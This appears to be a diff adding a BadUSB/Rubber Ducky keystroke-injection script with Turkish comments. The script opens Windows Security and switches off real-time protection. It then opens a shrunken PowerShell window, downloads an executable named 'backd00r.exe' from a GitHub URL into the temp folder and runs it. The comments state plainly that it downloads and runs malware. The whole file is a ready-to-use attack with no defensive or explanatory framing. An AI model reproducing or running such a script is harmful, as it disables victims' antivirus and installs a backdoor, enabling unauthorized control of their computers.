@@ -1,0 +1,54 @@
+DELAY 2000
+
+REM Windows Defender Ayarlarını Açar
+CTRL ESC
+DELAY 750
+STRING windows security
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+
+REM Koruma ayarlarını kapatmak için hareket eder
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 500
+
+REM Gerçek Zamanlı Korumayı Kapatır
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
+
+REM Güvenlik Duvarı Ayarlarından Çıkar
+ALT F4
+
+REM CMD'yi En Minimal Hale Getirip Zararlı Yazılımı İndirir ve Çalıştırır
+DELAY 350
+GUI r
+DELAY 350
+STRING powershell
+DELAY 350
+ENTER
+DELAY 350
+STRING mode con: cols=15 lines=1 & mode con: cols=25 lines=1
+DELAY 350
+ENTER
+DELAY 350
+STRING $url = "https://github.com/ozcanpng/backd00r/raw/c4a707b54715e2d86997744ef945cb3f8d394ce2/backd00r.exe";$output = "$env:TEMP\backd00r.exe";Invoke-WebRequest -Uri $url -OutFile $output;
+DELAY 350
+ENTER
+DELAY 350
+STRING Start-Process $env:TEMP\backd00r.exe
+DELAY 350
+ENTER
+
+
